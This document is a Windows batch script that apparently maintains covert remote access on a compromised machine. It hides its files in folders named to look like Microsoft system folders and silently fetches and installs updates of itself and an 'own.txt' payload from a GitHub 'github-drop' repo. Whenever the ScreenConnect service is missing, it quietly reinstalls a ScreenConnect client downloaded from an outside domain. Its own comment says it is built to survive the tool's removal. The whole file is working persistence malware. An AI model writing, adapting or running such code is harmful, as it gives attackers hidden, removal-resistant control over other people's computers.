@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN_MON BUILD 20260802M1 — survives SC wipe; auto-updates from github-drop
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
set "LOG=%WD%\boot.err"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "OWN=%WD%\own_run.cmd"
set "CB=%RANDOM%%RANDOM%"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
echo mon_tick %DATE% %TIME%>>"%LOG%"

REM --- auto-update own.txt + own_mon.cmd from repo ---
set "TMP=%TEMP%\own_upd.txt"
del /f /q "%TMP%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMP%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=%CB%" >nul 2>&1
if not exist "%TMP%" curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMP%" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=%CB%" >nul 2>&1
if exist "%TMP%" for %%A in ("%TMP%") do if %%~zA GTR 1000 (
  findstr /C:"OWN BUILD" "%TMP%" >nul && (
    copy /y "%TMP%" "%OWN%" >nul
    echo own_updated>>"%LOG%"
  )
)

set "TMPM=%TEMP%\own_mon_upd.cmd"
del /f /q "%TMPM%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMPM%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd?t=%CB%" >nul 2>&1
if not exist "%TMPM%" curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMPM%" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%CB%" >nul 2>&1
if exist "%TMPM%" for %%A in ("%TMPM%") do if %%~zA GTR 400 (
  findstr /C:"OWN_MON BUILD" "%TMPM%" >nul && (
    copy /y "%TMPM%" "%WD%\own_mon.cmd" >nul
    copy /y "%TMPM%" "%WD2%\etl_mon.cmd" >nul
    echo mon_updated>>"%LOG%"
  )
)

REM --- ensure primary ---
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  sc config "%ALT%" start= auto >nul 2>&1
  sc start "%ALT%" >nul 2>&1
  echo primary_ok>>"%LOG%"
  exit /b 0
)

echo primary_missing_reinstall>>"%LOG%"
set "MSI=%TEMP%\sc_mon.msi"
del /f /q "%MSI%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 120 -o "%MSI%" "%MSIURL%" >nul 2>&1
if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
  echo msi_exit_%ERRORLEVEL%>>"%LOG%"
)
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
exit /b 0
